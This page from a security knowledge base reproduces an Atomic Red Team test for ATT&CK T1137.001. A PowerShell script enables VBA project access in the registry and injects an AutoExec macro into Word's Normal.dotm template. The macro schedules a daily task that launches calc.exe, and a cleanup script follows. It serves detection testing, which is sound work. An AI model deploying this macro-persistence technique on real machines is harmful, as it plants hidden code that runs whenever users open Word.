---
atomic_guid: "940db09e-80b6-4dd0-8d4d-7764f89b47a8"
title: "Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell"
framework: "atomic"
generated: "true"
attack_technique_id: "T1137.001"
attack_technique_name: "Office Application Startup: Office Template Macros."
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.001/T1137.001.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "940db09e-80b6-4dd0-8d4d-7764f89b47a8"
  - "Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Injects a Macro in the Word default template "Normal.dotm" and makes it execute each time that Word is opened. In this test, the Macro creates a sheduled task to open Calc.exe every evening.

## ATT&CK Mapping

- [[kb/attack/techniques/T1137-office_application_startup#^t1137001-office-template-macros|T1137.001: Office Template Macros]]

## Dependencies

Microsoft Word must be installed

### Prerequisite Check

```untitled
try {
  New-Object -COMObject "Word.Application" | Out-Null
  Stop-Process -Name "winword"
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```untitled
Write-Host "You will need to install Microsoft Word manually to meet this requirement"
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
# Registry setting to "Trust access to the VBA project object model" in Word
$registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
$registryValue = "AccessVBOM"
$registryData = "1"
# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0
$flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
$flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"
# Get the value of the Key/Value pair
$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue
# Logical operation to: if the value of the key/value is 1, do nothing - 
# if the value is 0, change it to 1 and create flag1 - 
# if it doesn't exist, create the value and flag2
if ($value -eq "1") 
{
  Write-Host "The registry value '$registryValue' already exists with the required setting."
}   
  elseif ($value -eq "0") 
{
  Write-Host "The registry value was set to 0, temporarily changing to 1."
  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
  echo "flag1" > $flagPath1
} 
  else 
{
  Write-Host "The registry value '$registryValue' does not exist, temporarily creating it."
  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
  echo "flag2" > $flagPath2
}
Add-Type -AssemblyName Microsoft.Office.Interop.Word
# Define the path of copied normal template for restoral
$copyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm"
# Define the path to the normal template
$docPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal.dotm"
# Create copy of orginal template for restoral
Copy-Item -Path $docPath -Destination $copyPath -Force
# VBA code to be insterted as a Macro
# Will create a scheduled task to open the Calculator at 8:04pm daily
$vbaCode = @"
  Sub AutoExec()
  Dim applicationPath As String
  Dim taskName As String
  Dim runTime As String
  Dim schTasksCmd As String
  applicationPath = "C:\Windows\System32\calc.exe"
  taskName = "OpenCalcTask"
  runTime = "20:04"
  schTasksCmd = "schtasks /create /tn """ & taskName & """ /tr """ & applicationPath & """ /sc daily /st " & runTime & " /f"
  Shell "cmd.exe /c " & schTasksCmd, vbNormalFocus
  End Sub
"@
# Create a new instance of Word.Application
$word = New-Object -ComObject Word.Application
# Keep the Word application hidden
$word.Visible = $false
# Open the document
$document = $word.Documents.Open($docPath)
# Access the VBA project of the document
$vbaProject = $document.VBProject
# Add a new module to the VBA project
$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule
# Add the VBA code to the new module
$newModule.CodeModule.AddFromString($vbaCode)
# Run the Macro
$word.run("AutoExec")
# Save and close the document
$document.SaveAs($docPath)
$document.Close()
# Quit Word
$word.Quit()
# Release COM objects
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null
```

### Cleanup

```powershell
# Registry setting to "Trust access to the VBA project object model" in Word
$registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
$registryValue = "AccessVBOM"
$registryData1 = "1"
$registryData0 = "0"
# Defines the path each flag file created depending on the original registry state
$flagPath1 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt"
$flagPath2 = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt"
# Define the path of copied normal template for restoral
$copyPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm"
# Define the path to the normal template
$docPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal.dotm"
# Delete the scheduled task created by the Macro
schtasks /Delete /TN "OpenCalcTask" /F | Out-Null
#Restore the orginal template if the backup copy exists
if (Test-Path $copyPath)
{
  #Delete the injected template
  Remove-Item -Force $docPath -ErrorAction SilentlyContinue
  # Restore the original template
  Rename-Item -Force -Path $copyPath -NewName $docPath -ErrorAction SilentlyContinue
  Write-Host "The original template has been restored"
}
  else
{
  Write-Host "The original template is present"
}
#Restore the original state of the registry key
if (Test-Path $flagPath1) 
{
  # The value was originally 0, set back to 0
  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData0 -PropertyType DWORD -Force | Out-Null
  Remove-Item -Force $flagPath1 -ErrorAction SilentlyContinue
  Write-Host "The original registry state has been restored"
} 
  elseif (Test-Path $flagPath2)
{
  #The value did not previously exist, delete the value
  Remove-ItemProperty -Path $registryKey -Name $registryValue | Out-Null
  Remove-Item -Force $flagPath2 -ErrorAction SilentlyContinue | Out-Null
  Write-Host "The original registry state has been restored"
}
  else 
{
  # The value was already 1, do nothing
  Write-Host "The value $registryValue already existed in $registryKey."
}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.001/T1137.001.yaml)
